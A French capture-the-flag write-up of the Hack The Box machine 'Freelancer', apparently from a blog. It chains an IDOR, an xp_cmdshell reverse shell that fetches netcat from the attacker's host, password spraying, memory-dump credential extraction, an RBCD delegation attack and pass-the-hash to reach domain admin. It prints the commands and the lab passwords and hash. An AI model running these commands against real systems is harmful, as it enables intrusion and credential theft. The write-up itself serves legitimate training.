---
date: 2024-09-30T13:36:12-05:00
# description: ""
image: "/images/HTB-Freelancer/Freelancer.png"
showTableOfContents: true
tags: ["HackTheBox"]
categories: ["Writeups"]
title: "HTB: Freelancer"
type: "post"
---

* Platforme: Hack The Box
* Lien: [Freelancer](https://app.hackthebox.com/machines/Freelancer)
* Niveau: Difficile
* OS: Windows
---

Freelancer consiste à exploiter une application web et, plus tard, un contrôleur de domaine. Le site web permet la création de deux types de comptes. Après l'enregistrement, nous exploitons une vulnérabilité IDOR (Insecure Direct Object Reference) pour accéder à un compte administrateur. Sur la page d'administration, nous trouvons un terminal SQL, que nous utilisons pour obtenir notre accès initial.

Une exploration plus poussée du système révèle des mots de passe dans un fichier de configuration, que nous comparons à une liste d'utilisateurs, ce qui nous permet de pivoter vers un autre compte et d'obtenir le drapeau utilisateur. Nous extrayons ensuite une archive 7z contenant un vidage de mémoire complet. En utilisant MemProcFS, nous analysons le dump et récupérons un autre mot de passe, nous permettant de prendre le contrôle d'un autre compte. 

Avec Bloodhound, nous identifions la présence de la permission `GenericWrite`, que nous exploitons par le biais d'une délégation restreinte basée sur les ressources (RBCD). Nous obtenons ainsi le hash de l'administrateur, ce qui nous permet d'obtenir le drapeau root.

Adresse IP cible - `10.10.11.5`

## Balayage

```
./nmap_scan.sh 10.10.11.5 Freelancer
```

> J'utilise un script pour le processus de balayage, disponible [ici](https://github.com/K-Scorpio/scripts-collection/blob/main/nmap_scan.sh).

**Résultats**

```shell
Running detailed scan on open ports: 53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49667,49671,49676,49677,49680,49685,51337,55297
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-30 13:27 CDT
Nmap scan report for 10.10.11.5
Host is up (0.053s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          nginx 1.25.5
|_http-server-header: nginx/1.25.5
|_http-title: Did not follow redirect to http://freelancer.htb/
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-09-30 23:27:24Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: freelancer.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: freelancer.htb0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  adws?
| fingerprint-strings: 
|   DNSStatusRequestTCP, Kerberos, SMBProgNeg, afp, oracle-tns: 
|_    Ihttp://schemas.microsoft.com/ws/2006/05/framing/faults/UnsupportedVersion
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49671/tcp open  msrpc         Microsoft Windows RPC
49676/tcp open  msrpc         Microsoft Windows RPC
49677/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49680/tcp open  msrpc         Microsoft Windows RPC
49685/tcp open  msrpc         Microsoft Windows RPC
51337/tcp open  msrpc         Microsoft Windows RPC
55297/tcp open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
| ms-sql-ntlm-info: 
|   10.10.11.5\SQLEXPRESS: 
|     Target_Name: FREELANCER
|     NetBIOS_Domain_Name: FREELANCER
|     NetBIOS_Computer_Name: DC
|     DNS_Domain_Name: freelancer.htb
|     DNS_Computer_Name: DC.freelancer.htb
|     DNS_Tree_Name: freelancer.htb
|_    Product_Version: 10.0.17763
|_ssl-date: 2024-09-30T23:28:31+00:00; +5h00m00s from scanner time.
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2024-09-30T15:02:05
|_Not valid after:  2054-09-30T15:02:05
| ms-sql-info: 
|   10.10.11.5\SQLEXPRESS: 
|     Instance name: SQLEXPRESS
|     Version: 
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|     TCP port: 55297
|     Named pipe: \\10.10.11.5\pipe\MSSQL$SQLEXPRESS\sql\query
|_    Clustered: false
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port9389-TCP:V=7.94SVN%I=7%D=9/30%Time=66FAED91%P=x86_64-pc-linux-gnu%r
SF:(DNSStatusRequestTCP,4B,"\x08Ihttp://schemas\.microsoft\.com/ws/2006/05
SF:/framing/faults/UnsupportedVersion")%r(Kerberos,4B,"\x08Ihttp://schemas
SF:\.microsoft\.com/ws/2006/05/framing/faults/UnsupportedVersion")%r(SMBPr
SF:ogNeg,4B,"\x08Ihttp://schemas\.microsoft\.com/ws/2006/05/framing/faults
SF:/UnsupportedVersion")%r(oracle-tns,4B,"\x08Ihttp://schemas\.microsoft\.
SF:com/ws/2006/05/framing/faults/UnsupportedVersion")%r(afp,4B,"\x08Ihttp:
SF://schemas\.microsoft\.com/ws/2006/05/framing/faults/UnsupportedVersion"
SF:);
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2024-09-30T23:28:19
|_  start_date: N/A
|_clock-skew: mean: 4h59m59s, deviation: 0s, median: 4h59m59s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 74.93 seconds
```

Nous avons affaire à un contrôleur de domaine, un site web et une redirection vers `freelancer.htb`. Mettons à jour notre fichier `/etc/hosts`.

```
sudo echo "10.10.11.5 freelancer.htb dc.freelancer.htb" | sudo tee -a /etc/hosts
```

## Enumération

Nous trouvons un site web à l'adresse `http://freelancer.htb/`. Il s'agit d'une plateforme de freelancing et nous pouvons nous inscrire soit en tant qu'employeur, soit en tant que freelancer.

![Freelancer website](/images/HTB-Freelancer/freelancer_website.png)

Essayons de créer un compte employeur. Il y a une politique de mot de passe qui refuse les mots de passe trop commun, j'ai utilisé `Pa$$w0rd95`.

![Employer account registration](/images/HTB-Freelancer/registration.png)

La tentative de connexion échoue car notre compte nouvellement créé n'est pas actif.

![Account inactive](/images/HTB-Freelancer/account_inactive.png)

Nous pouvons contourner cette mesure en réinitialisant le mot de passe et en nous reconnectant. Pour le nouveau mot de passe, j'ai utilisé `Pa$$w0rd10`. Nous sommes maintenant en mesure de nous connecter et d'accéder au tableau de bord.

![Freelancer Dashboard](/images/HTB-Freelancer/Freelancer_Dashboard.png)

Dans la section `QR-Code`, nous obtenons un QR-Code permettant de se connecter sans utiliser d'identifiants. Pour déterminer où il mène, nous utilisons `zbarimg`.

![QR-Code section](/images/HTB-Freelancer/QRcode_section.png)

```
sudo apt install zbar-tools
zbarimg QR-Code.png
```

> J'ai enregistré l'image du qr-code sous le nom `QR-Code.png`.

![zbarimg tool](/images/HTB-Freelancer/zbarimg.png)

Le lien fourni nous amène à notre page de profil.

![profile page](/images/HTB-Freelancer/profile_page.png)

Lorsque nous examinons de plus près le lien généré, il semble contenir une chaîne base64 `MTAwMTA=` qui donne `10010` lorsqu'elle est décodée. Puisque le qrcode nous permet de nous connecter sans aucun identifiant, nous pouvons supposer que ce numéro est un identifiant de compte et que la chaîne suivante est une valeur de token. 

Nous allons tester une vulnérabilité potentielle de type IDOR (Insecure Direct Object Reference). Si l'url est toujours valide après avoir modifié l'ID, nous pourrions être en mesure d'accéder à un compte administrateur, qui a généralement un numéro d'ID tel que 1 ou 2.

Par exemple : Si notre lien QR-Code est `http://freelancer.htb/accounts/login/otp/MTAwMTA=/d134f9ff8e33c6bdcefc73a7597e4552/` nous utiliserons `http://freelancer.htb/accounts/login/otp/Mgo=/d134f9ff8e33c6bdcefc73a7597e4552/`.

Il s'avère qu'avec un numéro d'identification de 2, nous pouvons accéder à un compte administrateur. Il suffit de remplacer `MTAwMTA=` par `Mgo=` (chaîne base64 pour `2`).

![admin account](/images/HTB-Freelancer/admin_account.png)

De retour à l'énumération, nous découvrons une page `admin` à laquelle nous pouvons accéder.

![gobuster command results](/images/HTB-Freelancer/gobuster_findings.png)

![Freelancer admin dashboard](/images/HTB-Freelancer/freelancer_admindb.png)

## Accès Initial

Nous pouvons utiliser un terminal SQL sous `Development Tools`. Nous nous en servons pour exécuter quelques requêtes afin d'obtenir un reverse shell.

> Nous téléchargeons [ici](https://github.com/andrew-d/static-binaries/tree/master/binaries/windows/x86) le binaire `netcat` pour Windows, puis nous configurons un serveur web Python pour le placer sur la cible et enfin nous obtenons notre reverse shell en l'exécutant.

```SQL
EXECUTE AS LOGIN = 'sa';
EXECUTE sp_configure 'show advanced options', 1;
RECONFIGURE;
EXECUTE sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
EXECUTE xp_cmdshell "powershell.exe wget http://YOUR_IP/ncat.exe -OutFile C:\temp\nc.exe"
EXECUTE xp_cmdshell "powershell.exe C:\temp\nc.exe YOUR_IP PORT_NUMBER -e powershell"
```

![SQL reverse shell](/images/HTB-Freelancer/sql_revshell.png)

Nous avons maintenant un shell en tant que `sql_svc` qui est probablement un compte de service.

![shell as sql_svc](/images/HTB-Freelancer/foothold.png)

Nous trouvons différents utilisateurs sur la cible.

![users list](/images/HTB-Freelancer/users_list.png)

Dans `C:\Users\sql_svc\Downloads\SQLEXPR-2019_x64_ENU\sql-Configuration.INI` nous découvrons deux mots de passe.

![passwords list](/images/HTB-Freelancer/passwords_list.png)

### Shell en tant que mikasaackerman

A ce stade, nous avons une liste d'utilisateurs et de mots de passe, nous pouvons utiliser netexec pour faire du brute-forcing.

```
netexec smb 10.10.11.5 -u users.txt -p pwd.txt
```

Les identifiants `mikasaAckerman:IL0v3ErenY3ager` sont valides.

![netexec command](/images/HTB-Freelancer/netexec_bruteforcing.png)

Nous téléchargeons [RunasCs](https://github.com/antonioCoco/RunasCs) sur la cible et exécutons la commande ci-dessous.

```
.\runascs.exe mikasaAckerman "IL0v3ErenY3ager" powershell -r <YOUR_IP_ADDRESS>:<PORT_NUMBER>
```

![runascs command](/images/HTB-Freelancer/runascs_cmd.png)

Sur notre listener, nous acquérons un shell sous le nom de `mikasaackerman`.

![mickasaackerman shell](/images/HTB-Freelancer/mickasa_shell.png)

Sur le bureau, nous trouvons le drapeau utilisateur et deux autres fichiers `mail.txt` et `MEMORY.7z`.

![mickasaackerman desktop](/images/HTB-Freelancer/user_flag.png)

Grâce au fichier txt, nous apprenons que `MEMORY.7z` contient un vidage de mémoire complet, nous le transférerons sur notre machine locale pour un examen plus approfondi.

![mickasaackerman mail](/images/HTB-Freelancer/mail_to_mikasa.png)

Sur notre machine kali, nous démarrons un serveur FTP.

> Utilisez `sudo apt install python3-pyftpdlib` pour installer le module s'il est absent.

```
sudo python3 -m pyftpdlib --port 21 --write
```

![Python FTP server](/images/HTB-Freelancer/ftp_server.png)

Sur la cible, nous exécutons la commande suivante.

```
(New-Object Net.WebClient).UploadFile('ftp://YOUR_IP/MEMORY.7z', 'C:\Users\mikasaAckerman\Desktop\MEMORY.7z')
```

![MEMORY.7z File upload](/images/HTB-Freelancer/file_upload.png)

Après quelques minutes, nous obtenons l'archive, nous l'extrayons avec `7z x MEMORY.7z` et nous nous retrouvons avec un fichier nommé `MEMORY.DMP`.

> Vous pouvez installer 7z avec `sudo apt-get install p7zip-full`.

![Memory dump file](/images/HTB-Freelancer/memory_dump_file.png)

Nous utilisons [MemProcFS](https://github.com/ufrisk/MemProcFS) pour examiner le vidage de mémoire. Tout d'abord, nous devons installer toutes les dépendances.

```
sudo apt-get install libusb-1.0 fuse openssl lz4
```

Ensuite, nous téléchargeons l'archive depuis Github [ici](https://github.com/ufrisk/MemProcFS/releases/tag/v5.11). Après l'avoir extrait, exécutez la commande ci-dessous.

> Si l'opération de montage échoue et que vous obtenez `fuse : failed to access mountpoint /mnt/memprocfs : No such file or directory`, créez le répertoire dans `/mnt`.

```
sudo ./memprocfs -f <MEMORY.DMP file location> -forensic 1 -mount /mnt/memprocfs
```

![MemProcFS command](/images/HTB-Freelancer/memprocfs_command.png)

Nous avons besoin d'être root pour accéder au répertoire monté.

![MemProcFS mounted directory](/images/HTB-Freelancer/memory_mnt.png)

Dans `/mnt/memprocfs/registry/hive_files` nous trouvons les fichiers bruts de la ruche du registre Windows extraits du vidage de la mémoire. À partir de là, nous utiliserons les fichiers nécessaires pour trouver des informations sensibles:

* **SAM (Security Account Manager)**: Cette ruche contient des informations sur les comptes d'utilisateurs et les mots de passe hachés des utilisateurs locaux.
* **SYSTEM**: Elle comprend généralement des informations sur le système, telles que la configuration des pilotes, les paramètres du matériel, etc. De plus, elle détient également la clé nécessaire pour décrypter les mots de passe stockés dans la ruche SAM.
* **SECURITY**: Toutes les informations relatives à la sécurité sont stockées ici, y compris les attributions de droits, les stratégies de compte et les secrets LSA cryptés (qui peuvent contenir des informations d'identification de domaine mises en cache et d'autres données sensibles).

![hive files list](/images/HTB-Freelancer/hive_files.png)

```
impacket-secretsdump -sam 0xffffd3067d935000-SAM-MACHINE_SAM.reghive -system 0xffffd30679c46000-SYSTEM-MACHINE_SYSTEM.reghive -security 0xffffd3067d7f0000-SECURITY-MACHINE_SECURITY.reghive local
```

![registry hive files dump](/images/HTB-Freelancer/reghive_dump.png)

### Shell en tant que lorra199

Nous récupérons un autre mot de passe `PWN3D#l0rr@Armessa199`, que nous testons avec notre liste d'utilisateurs.

```
netexec smb 10.10.11.5 -u users.txt -p PWN3D#l0rr@Armessa199
```

Nous obtenons une confirmation pour les informations d'identification `lorra199:PWN3D#l0rr@Armessa199`.

![lorra199 credentials](/images/HTB-Freelancer/lorra_creds.png)

Nous nous connectons en tant que cet utilisateur avec `evil-winrm -i 10.10.11.5 -u lorra199 -p PWN3D#l0rr@Armessa199`.

![lorra199 login](/images/HTB-Freelancer/lorra_shell.png)

## Elévation de Privilèges

Ce compte ne semble pas contenir d'éléments intéressants, alors lançons Bloodhound à partir de ce point pour tenter de trouver d'autres pistes.

```
bloodhound-python -c all -u lorra199 -p 'PWN3D#l0rr@Armessa199' -d freelancer.htb -dc dc.freelancer.htb -ns 10.10.11.5
```

![bloodhound command](/images/HTB-Freelancer/bloodhound_cmd.png)


Nous constatons que `lorra199` est membre de `AD Recycle Bin`. La corbeille Active Directory est une fonctionnalité qui permet aux administrateurs de récupérer les objets AD supprimés accidentellement, tels que les utilisateurs ou les unités d'organisation (OU), sans avoir à les restaurer à partir de sauvegardes.

![AD Recycle bin membership](/images/HTB-Freelancer/AD_Recycle_bin.png)

Vérifions les objets supprimés.

```
Get-ADObject -filter 'isdeleted -eq $true -and name -ne "Deleted Objects"' -includeDeletedObjects -property *
```

Nous trouvons le compte `liza.kazanof` dans la corbeille.

![AD Recycle bin content](/images/HTB-Freelancer/ad_recylce_bin.png)

Nous pouvons restaurer l'objet en utilisant son `ObjectGUID`.

```
Restore-ADObject -identity "ebe15df5-e265-45ec-b7fc-359877217138"
```

> Je ne suis pas sûr qu'il soit possible d'accéder au compte administrateur depuis le compte de Liza Kazanof. Je mettrai à jour cette partie si je trouve un chemin d'exploitation pour le faire. **EDIT (08/10/2024)**: le chemin d'exploitation à partir du compte de Liza Kazanof est le chemin voulu par l'auteur et est détaillé dans l'article de 0xdf [ici](https://0xdf.gitlab.io/2024/10/05/htb-freelancer.html#intended-path).

Les membres de `AD Recycle Bin` ont la permission `GenericWrite` sur le contrôleur de domaine, nous pouvons l'utiliser pour exploiter la cible par une délégation restreinte basée sur les ressources (RBCD). _Pour en savoir plus, cliquez [ici](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/resource-based-constrained-delegation)_.

![GenericWrite privilege](/images/HTB-Freelancer/GenericWrite_priv.png)

1. Tout d'abord, nous créons un compte d'ordinateur (`KSCORPIO$`) dans le domaine avec un mot de passe spécifié (`LETSgetr00t!`).

```
impacket-addcomputer -computer-name 'KSCORPIO$' -computer-pass 'LETSgetr00t!' -dc-host freelancer.htb -domain-netbios freelancer.htb freelancer.htb/lorra199:'PWN3D#l0rr@Armessa199'
```

![GenericWrite privilege](/images/HTB-Freelancer/impacket_addcomputer.png)

2. Nous modifions ensuite l'attribut `msDS-AllowedToActOnBehalfOtherIdentity` sur le contrôleur de domaine (`DC$`) pour inclure l'objet `KSCORPIO$` afin d'usurper l'identité d'autres comptes contre `DC$`.

```
impacket-rbcd -delegate-from 'KSCORPIO$' -delegate-to 'DC$' -dc-ip 10.10.11.5 -action 'write' 'freelancer.htb/lorra199:PWN3D#l0rr@Armessa199'
```

![Delegation modification](/images/HTB-Freelancer/rbcd_delegation.png)

3. Nous obtenons un ticket Kerberos pour le service CIFS sur le contrôleur de domaine (`dc.freelancer.htb`), en nous faisant passer pour **Administrator**. Ce ticket nous permet d'effectuer diverses opérations au nom du compte administrateur sur la machine cible.

```
faketime -f +5h impacket-getST -spn 'cifs/dc.freelancer.htb' -impersonate Administrator -dc-ip 10.10.11.5 freelancer.htb/KSCORPIO$:'LETSgetr00t!'
```

> Le SPN (Service Principal Name) `cifs/dc.freelancer.htb` indique que nous voulons nous authentifier au service de partage de fichiers sur le contrôleur de domaine. Le service CIFS est essentiellement une extension du protocole SMB. _Pour en savoir plus, cliquez [ici](https://www.upguard.com/blog/cifs)._

![Kerberos ticket](/images/HTB-Freelancer/Kerberos_ticket.png)

4. Pour qu'Impacket utilise notre ticket, nous définissons une variable d'environnement pointant vers le fichier de cache.

```
export KRB5CCNAME=Administrator@cifs_dc.freelancer.htb@FREELANCER.HTB.ccache
```
![environmental variable for kerberos ticket use](/images/HTB-Freelancer/env_var.png)


5. Nous pouvons maintenant extraire les hashs NTLM du contrôleur de domaine. Nous obtenons de nombreux hashs dont celui de l'administrateur.

```
faketime -f +5h impacket-secretsdump 'freelancer.htb/Administrator@DC.freelancer.htb' -k -no-pass -dc-ip 10.10.11.5 -target-ip 10.10.11.5 -just-dc-ntlm
```

> Nous utilisons `+5h` avec faketime à cause du décalage d'horloge qui peut créer des problèmes de synchronisation. Nous savons que le décalage d'horloge est de 5h grâce à cette ligne provenant du résultat de nmap : `clock-skew : mean : 4h59m59s, deviation : 0s, median : 459m59s`.

![Kerberos ticket](/images/HTB-Freelancer/hashes_list.png)

6. Enfin, nous nous connectons avec le hash de l'administrateur en utilisant evil-winrm et le drapeau root est sur le bureau.

```
evil-winrm -i freelancer.htb -u administrator -H '0039318f1e8274633445bce32ad1a290'
```

![Kerberos ticket](/images/HTB-Freelancer/root_flag.png)

J'espère que cet article vous a été utile, merci d'avoir pris le temps de le lire!
